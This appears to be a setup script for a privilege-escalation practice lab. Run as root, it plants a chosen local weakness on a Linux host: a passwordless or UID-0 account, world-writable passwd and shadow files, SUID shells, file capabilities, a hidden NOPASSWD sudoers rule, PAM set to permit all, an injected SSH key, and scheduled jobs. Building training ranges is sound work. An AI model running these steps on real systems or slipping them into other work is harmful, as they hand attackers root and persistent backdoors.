#!/bin/sh

BOLD="\033[1m"
RED="\033[31;1m"
CLEAR="\033[0m"

if [ $# -eq 1 ]; then
  :
else
  printf "${RED}Error:${CLEAR} You are supposeed to run this command with exactly 1 argument\n${BOLD}Usage:${CLEAR} $0 vulnName\n" >&2
  exit
fi

if [ -f currentSet.txt ]; then
  :
else
  printf "${RED}Error:${CLEAR} You must first run ./pick.sh to select which vulnerabilities you want. They will be stored as the file currentSet.txt\n" >&2
  exit
fi

if id | grep -q "uid=0"; then
  :
else 
  printf "${RED}Error:${CLEAR} $0 must be run as root\n" >&2
  exit
fi

RANDOM=$$$(date +%s)

safeUseradd() {
  if grep -q -e "^$1" /etc/group; then
    useradd -g "$1" "$1"
  else
    useradd "$1"
  fi
}

#############
#   USERS   #
#############

noPasswd() {
  sed -i "s/jotaro:x/jotaro:/" /etc/passwd
}
sudoGroup() {
  if grep -q wheel /etc/group; then
    usermod -G wheel jolyne
  else
    usermod -G sudo jolyne
  fi
}
sshKey() {
  mkdir -p /home/jolyne
  mkdir -p /home/jolyne/.ssh
  cp -f assets/authorized_keys /home/jolyne/.ssh/authorized_keys
}
uidRoot() {
  sed -i "s/joseph:x:[^:]*:/joseph:x:0:/" /etc/passwd
}
admUser() {
  safeUseradd speedwagon
  if grep -q adm /etc/group; then
    usermod -G adm speedwagon
  fi
}
dockerUser() {
  safeUseradd jonathan
  usermod -g joestar jonathan
  if grep -q docker /etc/group; then
    usermod -G docker jonathan
  fi
}
lxdUser() {
  safeUseradd josuke
  usermod -g joestar josuke
  if grep -q lxd /etc/group; then
    usermod -G lxd josuke
  fi
}
typoUser() {
  cp -f /bin/sh /usr/bin/nologin
  safeUseradd kernpoops
  usermod -s "/usr/bin/nologin" kernpoops
}
noShadow() {
  cp -f "/bin/sh" "/bin/false"
  sed -i "s/sys:\*:/sys::/" /etc/shadow
  usermod -s "/bin/false" sys
}
permPasswd() {
  chmod 666 "/etc/passwd"
}
permShadow() {
  chmod 644 "/etc/shadow"
}
permGroup() {
  chmod 666 "/etc/group"
}
permGshadow() {
  chmod 644 "/etc/gshadow"
}
gshadowPass() {
  if grep -q sudo /etc/gshadow; then
    sed -i '/^sudo:/s#^\([^:]*:\)[^:]*:#\1$y$j9T$KYiAjUQBeuUqwyLtsvRVb1$Ht0Xrij/JaLF6ofobBPS9y1p530VQJmMGB2cmSbMxx3:#' /etc/gshadow
  else
    sed -i '/^wheel:/s#^\([^:]*:\)[^:]*:#\1$y$j9T$KYiAjUQBeuUqwyLtsvRVb1$Ht0Xrij/JaLF6ofobBPS9y1p530VQJmMGB2cmSbMxx3:#' /etc/gshadow
  fi
}
gshadowAdmin() {
  if grep -q sudo /etc/gshadow; then
    sed -i '/^sudo:/s/^\([^:]*:[^:]*:\)[^:]*/\1joseph/' /etc/gshadow
  else
    sed -i '/^wheel:/s/^\([^:]*:[^:]*:\)[^:]*/\1joseph/' /etc/gshadow
  fi
}

###################
#   PERMISSIONS   #
###################

aclPasswd() {
  for u in $(cat /etc/passwd | cut -d ":" -f1); do
    setfacl -m u:$u:rwx /etc/passwd
  done
}
aclShadow() {
  for u in $(cat /etc/passwd | cut -d ":" -f1); do
    setfacl -m u:$u:rwx /etc/shadow
  done
}
capCat() {
  f="/bin/cat"
  if [ -f $f ]; then
    setcap cap_dac_override=eip $f
  fi
}
capVim() {
  f="/usr/bin/vim.basic"
  if [ -f $f ]; then
    setcap cap_dac_override=eip $f
  fi
}
capLess() {
  f="$(which less)"
  if [ -f $f ]; then
    setcap cap_dac_override=eip $f
  else
    printf "${RED}Warning:${CLEAR} $f does not exist on the system. Skipping this vuln...\n"
  fi
}
bashCopy() {
  randVar=$(cat /dev/urandom | head -c 6 | base64 -w0 | tr -d "+" | tr -d "/")
  randVar="xkcd$randVar"
  if [ -f /bin/bash ]; then
    cp -f /bin/bash /bin/$randVar
    chmod u+s /bin/bash /bin/$randVar
  fi
}
zshSUID() {
  f="/bin/zsh"
  if [ -f $f ]; then
    chmod u+s $f
  else
    printf "${RED}Warning:${CLEAR} $f does not exist on the system. Skipping this vuln...\n"
  fi
}
fishSUID() {
  f="/bin/fish"
  if [ -f $f ]; then
    chmod u+s $f
  else
    printf "${RED}Warning:${CLEAR} $f does not exist on the system. Skipping this vuln...\n"
  fi
}
falseSUID() {
  f="/bin/false"
  if [ -f $f ]; then
    chmod u+s $f
  else
    printf "${RED}Warning:${CLEAR} $f does not exist on the system. Skipping this vuln...\n"
  fi
}
vimSUID() {
  f="/usr/bin/vim"
  if [ -f $f ]; then
    chmod u+s $f
  else
    printf "${RED}Warning:${CLEAR} $f does not exist on the system. Skipping this vuln...\n"
  fi
}
catSUID() {
  f="/bin/cat"
  if [ -f $f ]; then
    chmod u+s $f
  else
    printf "${RED}Warning:${CLEAR} $f does not exist on the system. Skipping this vuln...\n"
  fi
}

##############
#   SYSTEM   #
##############

sudoAll() {
  for u in $(cat /etc/passwd | awk -F: '{print $1}'); do
    usermod -a -G sudo $u
  done
}
fakeSudod() {
  randomVal=$((RANDOM % 3))
  case $randomVal in
    0)  echo "ALL   ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers.d/" ";;
    1)  echo "ALL   ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers.d/"  ";;
    2)  echo "ALL   ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers.d/README
  esac
 
}
vimSudo() {
  f="/usr/bin/vim"
  if [ -f $f ]; then
    echo "%sudo ALL=(ALL:ALL) NOPASSWD:/usr/bin/vim" >> /etc/sudoers
  else
    printf "${RED}Warning:${CLEAR} $f does not exist on the system. Skipping this vuln...\n"
  fi
}
sudoUser() {
  echo "joestar ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers
}
pamCommonAuth() {
  f="/etc/pam.d/common-auth"
  if [ -f $f ]; then
    sed -ie "s/nullok_secure/nullok/g" $f
    sed -ie "s/pam_rootok.so/pam_permit.so/g" $f
    sed -ie "s/pam_deny.so/pam_permit.so/g" $f
  else
    printf "${RED}Warning:${CLEAR} $f does not exist on the system. Skipping this vuln...\n"
  fi
}
pamSu() {
  f="/etc/pam.d/su"
  if [ -f $f ]; then
    sed -ie "s/pam_rootok.so/pam_permit.so/g" $f
  else
    printf "${RED}Warning:${CLEAR} $f does not exist on the system. Skipping this vuln...\n"
  fi
}
pamPermit() {
  if [ -f "/lib/x86_64-linux-gnu/security/pam_permit.so" ]; then
    pam_path="/lib/x86_64-linux-gnu/security"
  else
    pam_path="/lib/i386-linux-gnu/security"
  fi
  cp -f $pam_path/pam_permit.so $pam_path/pam_deny.so
}

################
#   SCHEDULE   #
################

cronJob() {
  # Plants a malicious cron job in cron.d
  echo "* * * * * root /bin/bash -c 'echo pwned > /tmp/cron_pwn'" > /etc/cron.d/malicious_cron
}

anacronJob() {
  # Appends a malicious line to anacrontab
  echo "1 5 malicious.job /bin/bash -c 'echo pwned > /tmp/anacron_pwn'" >> /etc/anacrontab
}

atJob() {
  # Schedules a malicious 'at' job if 'at' is installed
  if command -v at >/dev/null; then
    echo "touch /tmp/at_pwn" | at now + 24 hours 2>/dev/null
  else
    printf "${RED}Warning:${CLEAR} 'at' command not found. Skipping this vuln...\n"
  fi
}


$1
